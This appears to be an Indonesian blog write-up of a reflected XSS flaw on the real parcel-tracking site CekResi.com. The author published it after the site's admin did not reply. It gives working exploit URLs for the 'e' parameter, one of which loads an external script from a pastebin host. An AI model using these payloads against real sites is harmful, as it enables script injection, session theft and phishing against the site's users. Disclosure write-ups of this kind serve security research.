---
slug: xss-cekresi
title: Cross Site Scripting on Cekresi
description: Cross Site Scripting yang ditemukan di website Cekresi.com pada parameter e
date: 2019-07-24
author: Rahul
tags: ["pentest", "xss", "security"]
featured: false
editable: true
---

<hr />

## [Introduction](#introduction)

Hai lur, kali ini sedikit tulisan tentang salah satu bug yang saya temukan pada website [CekResi.com](https://cekresi.com/) ya karena ndak ada balasan email dari dari admin web tersebut, ya udah ku write up aja daripada ku simpan sendiri hehe.

<figure>
  <img src="https://cekresi.com/images/cek-resi-logo.png" alt="Logo Cekresi" />
  <figcaption>Logo Cekresi</figcaption>
</figure>

## [About CekResi.com](#about-cekresicom)

CekResi.com sendiri adalah website yang populer untuk melakukan tracking barang yang dikirim atau diterima lewat nomer RESI yang di berikan dari kantor pemaketan.

## [Discovery](#discovery)

Awal aku menemukan bug ini ketika disuruh atasanku mengecek resi pengiriman dokumen ke kantor pusat tempat aku bekerja, nah aku inget ada website CekResi.com untuk sekedar mentracking barang sudah sampai mana.

Nah kumasukkan nomer resinya dan mengetahui bahwa paket sudah sampai ke Jakarta. Aku ingat disana ada form input nomer resi, ku coba isi dengan payload XSS sederhana, namun gagal.

### [Finding the Vulnerable Parameter](#finding-the-vulnerable-parameter)

Tidak berhenti di situ, saya mencoba menginstall firefox quantum dan hackbar quantum, kebetulan di sana ada _auto input parameter_ dengan script XSS. Dan ternyata aku menemukan sebuah parameter dimana bisa di masukkan payload XSS.

Parameter yang ku temukan seperti berikut [https://cekresi.com/m/index?viewstate=&e=&noresi=](https://cekresi.com/m/index?viewstate=&e=&noresi=) pada parameter **e=** disitu saya menyisipkan payload XSS sederhanya `"><script>prompt(document.domain);</script>` untuk memunculkan nama domain dari website cekresi.com sehingga url nya menjadi seperti ini :

```php
https://cekresi.com/m/index?viewstate=&e="><script>prompt(document.domain);</script>&noresi=TAN
```

## [Exploitation](#exploitation)

### [Basic XSS](#basic-xss)

Berikut penampakannya :

<figure>
  <img src="https://raw.githubusercontent.com/tanmyid/go-blog/master/img/xss-cekresi/xss-cekresi.png" alt="XSS successful" />
  <figcaption>Boom :D</figcaption>
</figure>

### [Advanced XSS with External Script](#advanced-xss-with-external-script)

Tak sampai disitu, saya juga mencoba untuk menggunakan script html dalam XSS kali ini dan ternyata berhasil. Berikut payloadnya :

```php
https://cekresi.com/m/index?viewstate=&e="><script src=https://pastebin.com/raw/mUBsAPXz/></script>&noresi=TAN
```

Berikut penampakannya :

<figure>
  <img src="https://raw.githubusercontent.com/tanmyid/go-blog/master/img/xss-cekresi/xss-cekresi-2.png" alt="XSS with external script" />
  <figcaption>Script HTML</figcaption>
</figure>

## [Important Note](#important-note)

Eh iya lupa, ini hanya berlaku pada browser mozilla firefox ya, kalian pasti sudah tau alasannya dong.

## [Kesimpulan](#kesimpulan)

Nah semoga bermanfaat bagi kalian. Terima Kasih.
